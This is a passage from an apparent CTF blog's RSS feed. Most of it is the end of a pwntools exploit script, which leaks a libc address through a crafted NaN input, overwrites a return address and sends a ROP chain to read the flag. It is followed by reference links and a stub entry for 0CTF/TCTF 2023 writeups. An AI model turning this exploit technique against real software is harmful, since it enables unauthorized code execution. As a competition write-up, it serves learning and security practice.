</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;| &#39;</span>, model)    
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">trasting</span>(idx):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;66&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, str(idx)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;| &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;aaaa&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>model <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0|0|0|0|0|&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x400</span>
</span></span><span style="display:flex;"><span>import_module(str(len(model))<span style="color:#f92672">.</span>encode()<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;|&#39;</span><span style="color:#f92672">+</span>model)
</span></span><span style="display:flex;"><span>import_module(str(len(model))<span style="color:#f92672">.</span>encode()<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;|&#39;</span><span style="color:#f92672">+</span>model)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>trasting(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NaN <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;Q&#34;</span>, struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;d&#34;</span>, float(<span style="color:#e6db74">&#39;nan&#39;</span>)))[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>print(hex(NaN))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>model <span style="color:#f92672">=</span> str(NaN)<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;|0|0|0|0|&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x400</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>import_module(str(len(model))<span style="color:#f92672">.</span>encode()<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;|&#39;</span><span style="color:#f92672">+</span>model)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;r = &#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> float(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; &#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)<span style="color:#f92672">.</span>decode())
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;d&#34;</span>, leak <span style="color:#f92672">*</span> (<span style="color:#f92672">-</span><span style="color:#ae81ff">20</span>))) <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span><span style="color:#ae81ff">0xfff</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x21a000</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;libc &#34;</span> <span style="color:#f92672">+</span> hex(libc<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1280|&#39;</span>
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x65737341203A2928</span>) <span style="color:#f92672">//</span> magic
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x30</span>
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x4025A1</span>)
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;X&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">1284</span> <span style="color:#f92672">-</span> len(pl))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>import_module(pl)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP(libc)
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">3</span>, libc<span style="color:#f92672">.</span>bss(), <span style="color:#ae81ff">0x100</span>)
</span></span><span style="display:flex;"><span>rop<span style="color:#f92672">.</span>write(<span style="color:#ae81ff">1</span>, libc<span style="color:#f92672">.</span>bss(), <span style="color:#ae81ff">0x100</span>)
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">=</span> <span style="color:#ae81ff">24</span><span style="color:#f92672">*</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>
</span></span><span style="display:flex;"><span>pl <span style="color:#f92672">+=</span> bytes(rop)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(pl)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h1 id="references">References</h1>
<p><a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/system-wsystem?view=msvc-170">https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/system-wsystem?view=msvc-170</a></p>
<p><a href="https://schlafwandler.github.io/posts/attacking-wine-part-i/">https://schlafwandler.github.io/posts/attacking-wine-part-i/</a></p>
<p><a href="https://github.com/Nautilus-Institute/quals-2024/tree/main">https://github.com/Nautilus-Institute/quals-2024/tree/main</a></p>
<p><a href="https://www.pcre.org/">https://www.pcre.org/</a></p>
<p><a href="https://github.com/PCRE2Project/pcre2">https://github.com/PCRE2Project/pcre2</a></p>
<p><a href="https://wiki.winehq.org/Wine_Developer%27s_Guide/Debugging_Wine">https://wiki.winehq.org/Wine_Developer%27s_Guide/Debugging_Wine</a></p>
<p><a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/get-errno?view=msvc-170">https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/get-errno?view=msvc-170</a></p>
<p><a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/errno-constants?view=msvc-170">https://learn.microsoft.com/en-us/cpp/c-runtime-library/errno-constants?view=msvc-170</a></p>
]]></description>
      
    </item>
    
    
    
    <item>
      <title>0CTF/TCTF 2023 Writeups</title>
      <link>https://w1n-gl0ry.github.io/posts/0ctf-tctf/</link>
      <pubDate>Tue, 12 Dec 2023 17:37:11 +0800</pubDate>
      
      <guid>https://w1n-gl0ry.github.io/posts/0ctf-tctf/</guid>
      <description><![CDATA[<p>under maintenance</p>
]]></description>
      
    </item>
    
    
  </channel>
</rss>
